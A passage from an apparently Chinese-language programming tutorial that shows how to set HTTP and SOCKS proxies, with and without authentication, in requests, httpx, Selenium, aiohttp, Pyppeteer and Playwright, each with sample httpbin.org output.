class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">pip3 install &quot;requests[socks]&quot;</span><br></pre>      </td>    </tr>  </table></figure><p>运行结果是完全相同的：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"args"</span>: &#123;&#125;,</span><br><span class="line">  <span class="string">"headers"</span>: &#123;</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"*/*"</span>,</span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">    <span class="string">"Host"</span>: <span class="string">"httpbin.org"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"python-requests/2.22.0"</span>,</span><br><span class="line">    <span class="string">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-5e8f364a-589d3cf2500fafd47b5560f2"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"origin"</span>: <span class="string">"210.173.1.204"</span>,</span><br><span class="line">  <span class="string">"url"</span>: <span class="string">"https://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>另外，还有一种设置方式，即使用 socks 模块，也需要像上文一样安装 socks 库。这种设置方法如下所示：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socks</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">socks.set_default_proxy(socks.SOCKS5, <span class="string">'127.0.0.1'</span>, <span class="number">7891</span>)</span><br><span class="line">socket.socket = socks.socksocket</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(response.text)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">    print(<span class="string">'Error'</span>, e.args)</span><br></pre>      </td>    </tr>  </table></figure><p>使用这种方法也可以设置 SOCKS 代理，运行结果完全相同。相比第一种方法，此方法是全局设置的。我们可以在不同情况下选用不同的方法。</p><h2 id="4-httpx-的代理设置"><a href="#4-httpx-的代理设置" class="headerlink" title="4. httpx 的代理设置"></a>4. httpx 的代理设置</h2><p>httpx 的用法本身就与 requests 的使用非常相似，所以其也是通过 proxies 参数来设置代理的，不过与 requests 不同的是，proxies 参数的键名不能再是 <code>http</code> 或 <code>https</code>，而需要更改为 <code>http://</code> 或 <code>https://</code>，其他的设置是一样的。</p><p>对于 HTTP 代理来说，设置方法如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'127.0.0.1:7890'</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">'http://'</span>: <span class="string">'http://'</span> + proxy,</span><br><span class="line">    <span class="string">'https://'</span>: <span class="string">'http://'</span> + proxy,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> httpx.Client(proxies=proxies) <span class="keyword">as</span> client:</span><br><span class="line">    response = client.get(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(response.text)</span><br></pre>      </td>    </tr>  </table></figure><p>对于需要认证的代理，也是改下 proxy 的值即可：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">proxy = <span class="string">'username:password@127.0.0.1:7890'</span></span><br></pre>      </td>    </tr>  </table></figure><p>这里只需要将 <code>username</code> 和 <code>password</code> 替换即可。</p><p>运行结果和使用 requests 是类似的，结果如下：</p><figure class="highlight json">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"args"</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">"headers"</span>: &#123;</span><br><span class="line">    <span class="attr">"Accept"</span>: <span class="string">"*/*"</span>,</span><br><span class="line">    <span class="attr">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">    <span class="attr">"Host"</span>: <span class="string">"httpbin.org"</span>,</span><br><span class="line">    <span class="attr">"User-Agent"</span>: <span class="string">"python-httpx/0.18.1"</span>,</span><br><span class="line">    <span class="attr">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-60e9a3ef-5527ff6320484f8e46d39834"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"origin"</span>: <span class="string">"210.173.1.204"</span>,</span><br><span class="line">  <span class="attr">"url"</span>: <span class="string">"https://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>对于 SOCKS 代理，我们需要安装 httpx-socks 库，安装方法如下：</p><figure class="highlight cmake">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">pip3 <span class="keyword">install</span> <span class="string">"httpx-socks[asyncio]"</span></span><br></pre>      </td>    </tr>  </table></figure><p>这样会同时安装同步和异步两种模式的支持。</p><p>对于同步模式，设置方法如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">from</span> httpx_socks <span class="keyword">import</span> SyncProxyTransport</span><br><span class="line"></span><br><span class="line">transport = SyncProxyTransport.from_url(</span><br><span class="line">    <span class="string">'socks5://127.0.0.1:7891'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> httpx.Client(transport=transport) <span class="keyword">as</span> client:</span><br><span class="line">    response = client.get(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(response.text)</span><br></pre>      </td>    </tr>  </table></figure><p>这里我们需要设置一个 transport 对象，并配置 SOCKS 代理的地址，同时在声明 httpx 的 Client 对象的时候传入 transport 参数即可，运行结果和刚才是一样的。</p><p>对于异步模式，设置方法如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> httpx_socks <span class="keyword">import</span> AsyncProxyTransport</span><br><span class="line"></span><br><span class="line">transport = AsyncProxyTransport.from_url(</span><br><span class="line">    <span class="string">'socks5://127.0.0.1:7891'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> httpx.AsyncClient(transport=transport) <span class="keyword">as</span> client:</span><br><span class="line">        response = <span class="keyword">await</span> client.get(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">        print(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main())</span><br></pre>      </td>    </tr>  </table></figure><p>和同步模式不同的是，transport 对象我们用的是 AsyncProxyTransport 而不是 SyncProxyTransport，同时需要将 Client 对象更改为 AsyncClient 对象，其他的不变，运行结果是一样的。</p><h2 id="5-Selenium-的代理设置"><a href="#5-Selenium-的代理设置" class="headerlink" title="5. Selenium 的代理设置"></a>5. Selenium 的代理设置</h2><p>Selenium 同样可以设置代理，这里以 Chrome 为例来介绍其设置方法。</p><p>对于无认证的代理，设置方法如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'127.0.0.1:7890'</span></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line">options.add_argument(<span class="string">'--proxy-server=http://'</span> + proxy)</span><br><span class="line">browser = webdriver.Chrome(options=options)</span><br><span class="line">browser.get(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">print(browser.page_source)</span><br><span class="line">browser.close()</span><br></pre>      </td>    </tr>  </table></figure><p>运行结果如下：</p><figure class="highlight json">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"args"</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">"headers"</span>: &#123;</span><br><span class="line">    <span class="attr">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span>,</span><br><span class="line">    <span class="attr">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">    <span class="attr">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>,</span><br><span class="line">    <span class="attr">"Host"</span>: <span class="string">"httpbin.org"</span>,</span><br><span class="line">    <span class="attr">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="attr">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"</span>,</span><br><span class="line">    <span class="attr">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-5e8f39cd-60930018205fd154a9af39cc"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"origin"</span>: <span class="string">"210.173.1.204"</span>,</span><br><span class="line">  <span class="attr">"url"</span>: <span class="string">"http://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>代理设置成功，<code>origin</code> 同样为代理 IP 的地址。</p><p>如果代理是认证代理，则设置方法相对比较繁琐，具体如下所示：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">7890</span></span><br><span class="line">username = <span class="string">'foo'</span></span><br><span class="line">password = <span class="string">'bar'</span></span><br><span class="line"></span><br><span class="line">manifest_json = <span class="string">"""&#123;"version":"1.0.0","manifest_version": 2,"name":"Chrome Proxy","permissions": ["proxy","tabs","unlimitedStorage","storage","&lt;all_urls&gt;","webRequest","webRequestBlocking"],"background": &#123;"scripts": ["background.js"]</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">background_js = <span class="string">"""</span></span><br><span class="line"><span class="string">var config = &#123;</span></span><br><span class="line"><span class="string">        mode: "fixed_servers",</span></span><br><span class="line"><span class="string">        rules: &#123;</span></span><br><span class="line"><span class="string">          singleProxy: &#123;</span></span><br><span class="line"><span class="string">            scheme: "http",</span></span><br><span class="line"><span class="string">            host: "%(ip) s",</span></span><br><span class="line"><span class="string">            port: %(port) s</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">chrome.proxy.settings.set(&#123;value: config, scope: "regular"&#125;, function() &#123;&#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function callbackFn(details) &#123;</span></span><br><span class="line"><span class="string">    return &#123;</span></span><br><span class="line"><span class="string">        authCredentials: &#123;username: "%(username) s",</span></span><br><span class="line"><span class="string">            password: "%(password) s"</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">chrome.webRequest.onAuthRequired.addListener(</span></span><br><span class="line"><span class="string">            callbackFn,</span></span><br><span class="line"><span class="string">            &#123;urls: ["&lt;all_urls&gt;"]&#125;,</span></span><br><span class="line"><span class="string">            ['blocking']</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">"""</span> % &#123;<span class="string">'ip'</span>: ip, <span class="string">'port'</span>: port, <span class="string">'username'</span>: username, <span class="string">'password'</span>: password&#125;</span><br><span class="line"></span><br><span class="line">plugin_file = <span class="string">'proxy_auth_plugin.zip'</span></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(plugin_file, <span class="string">'w'</span>) <span class="keyword">as</span> zp:</span><br><span class="line">    zp.writestr(<span class="string">"manifest.json"</span>, manifest_json)</span><br><span class="line">    zp.writestr(<span class="string">"background.js"</span>, background_js)</span><br><span class="line">options = Options()</span><br><span class="line">options.add_argument(<span class="string">"--start-maximized"</span>)</span><br><span class="line">options.add_extension(plugin_file)</span><br><span class="line">browser = webdriver.Chrome(options=options)</span><br><span class="line">browser.get(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">print(browser.page_source)</span><br><span class="line">browser.close()</span><br></pre>      </td>    </tr>  </table></figure><p>这里需要在本地创建一个 manifest.json 配置文件和 background.js 脚本来设置认证代理。运行代码之后，本地会生成一个 proxy_auth_plugin.zip 文件来保存当前配置。</p><p>运行结果和上例一致，<code>origin</code> 同样为代理 IP。</p><p>SOCKS 代理的设置也比较简单，把对应的协议修改为 <code>socks5</code> 即可，如无密码认证的代理设置方法为：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'127.0.0.1:7891'</span></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line">options.add_argument(<span class="string">'--proxy-server=socks5://'</span> + proxy)</span><br><span class="line">browser = webdriver.Chrome(options=options)</span><br><span class="line">browser.get(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">print(browser.page_source)</span><br><span class="line">browser.close()</span><br></pre>      </td>    </tr>  </table></figure><p>运行结果是一样的。</p><h2 id="6-aiohttp-的代理设置"><a href="#6-aiohttp-的代理设置" class="headerlink" title="6.aiohttp 的代理设置"></a>6.aiohttp 的代理设置</h2><p>对于 aiohttp 来说，我们可以通过 <code>proxy</code> 参数直接设置。HTTP 代理设置如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'http://127.0.0.1:7890'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(<span class="string">'https://httpbin.org/get'</span>, proxy=proxy) <span class="keyword">as</span> response:</span><br><span class="line">            print(<span class="keyword">await</span> response.text())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main())</span><br></pre>      </td>    </tr>  </table></figure><p>如果代理有用户名和密码，像 requests 一样，把 <code>proxy</code> 修改为如下内容：</p><figure class="highlight ini">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="attr">proxy</span> = <span class="string">'http://username:password@127.0.0.1:7890'</span></span><br></pre>      </td>    </tr>  </table></figure><p>这里只需要将 <code>username</code> 和 <code>password</code> 替换即可。</p><p>对于 SOCKS 代理，我们需要安装一个支持库 aiohttp-socks，其安装命令如下：</p><figure class="highlight cmake">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">pip3 <span class="keyword">install</span> aiohttp-socks</span><br></pre>      </td>    </tr>  </table></figure><p>我们可以借助于这个库的 ProxyConnector 来设置 SOCKS 代理，其代码如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">from</span> aiohttp_socks <span class="keyword">import</span> ProxyConnector</span><br><span class="line"></span><br><span class="line">connector = ProxyConnector.from_url(<span class="string">'socks5://127.0.0.1:7891'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession(connector=connector) <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(<span class="string">'https://httpbin.org/get'</span>) <span class="keyword">as</span> response:</span><br><span class="line">            print(<span class="keyword">await</span> response.text())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main())</span><br></pre>      </td>    </tr>  </table></figure><p>运行结果是一样的。</p><p>另外，这个库还支持设置 SOCKS4、HTTP 代理以及对应的代理认证，可以参考其官方介绍。</p><h2 id="7-Pyppeteer-的代理设置"><a href="#7-Pyppeteer-的代理设置" class="headerlink" title="7. Pyppeteer 的代理设置"></a>7. Pyppeteer 的代理设置</h2><p>对于 Pyppeteer 来说，由于其默认使用的是类似 Chrome 的 Chromium 浏览器，因此其设置方法和 Selenium 的 Chrome 一样，如 HTTP 无认证代理设置方法都是通过 <code>args</code> 来设置的，实现如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> pyppeteer <span class="keyword">import</span> launch</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'127.0.0.1:7890'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    browser = <span class="keyword">await</span> launch(&#123;<span class="string">'args'</span>: [<span class="string">'--proxy-server=http://'</span> + proxy], <span class="string">'headless'</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">    <span class="keyword">await</span> page.goto(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(<span class="keyword">await</span> page.content())</span><br><span class="line">    <span class="keyword">await</span> browser.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main())</span><br></pre>      </td>    </tr>  </table></figure><p>运行结果如下：</p><figure class="highlight json">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"args"</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">"headers"</span>: &#123;</span><br><span class="line">    <span class="attr">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>,</span><br><span class="line">    <span class="attr">"Accept-Encoding"</span>: <span class="string">"gzip, deflate, br"</span>,</span><br><span class="line">    <span class="attr">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>,</span><br><span class="line">    <span class="attr">"Host"</span>: <span class="string">"httpbin.org"</span>,</span><br><span class="line">    <span class="attr">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="attr">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3494.0 Safari/537.36"</span>,</span><br><span class="line">    <span class="attr">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-5e8f442c-12b1ed7865b049007267a66c"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"origin"</span>: <span class="string">"210.173.1.204"</span>,</span><br><span class="line">  <span class="attr">"url"</span>: <span class="string">"https://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>同样可以看到设置成功。</p><p>SOCKS 代理也一样，只需要将协议修改为 <code>socks5</code> 即可，代码实现如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> pyppeteer <span class="keyword">import</span> launch</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'127.0.0.1:7891'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    browser = <span class="keyword">await</span> launch(&#123;<span class="string">'args'</span>: [<span class="string">'--proxy-server=socks5://'</span> + proxy], <span class="string">'headless'</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">    <span class="keyword">await</span> page.goto(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(<span class="keyword">await</span> page.content())</span><br><span class="line">    <span class="keyword">await</span> browser.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main())</span><br></pre>      </td>    </tr>  </table></figure><p>运行结果也是一样的。</p><h2 id="8-Playwright-的代理设置"><a href="#8-Playwright-的代理设置" class="headerlink" title="8. Playwright 的代理设置"></a>8. Playwright 的代理设置</h2><p>相对 Selenium 和 Pyppeteer 来说，Playwright 的代理设置更加方便，其预留了一个 proxy 参数，可以在启动 Playwright 的时候设置。</p><p>对于 HTTP 代理来说，可以这样设置：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> sync_playwright</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">    browser = p.chromium.launch(proxy=&#123;</span><br><span class="line">        <span class="string">'server'</span>: <span class="string">'http://127.0.0.1:7890'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    page = browser.new_page()</span><br><span class="line">    page.goto(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(page.content())</span><br><span class="line">    browser.close()</span><br></pre>      </td>    </tr>  </table></figure><p>在调用 launch 方法的时候，我们可以传一个 proxy 参数，是一个字典。字典有一个必填的字段叫做 server，这里我们可以直接填写 HTTP 代理的地址即可。</p><p>运行结果如下：</p><figure class="highlight json">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"args"</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">"headers"</span>: &#123;</span><br><span class="line">    <span class="attr">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span>,</span><br><span class="line">    <span class="attr">"Accept-Encoding"</span>: <span class="string">"gzip, deflate, br"</span>,</span><br><span class="line">    <span class="attr">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>,</span><br><span class="line">    <span class="attr">"Host"</span>: <span 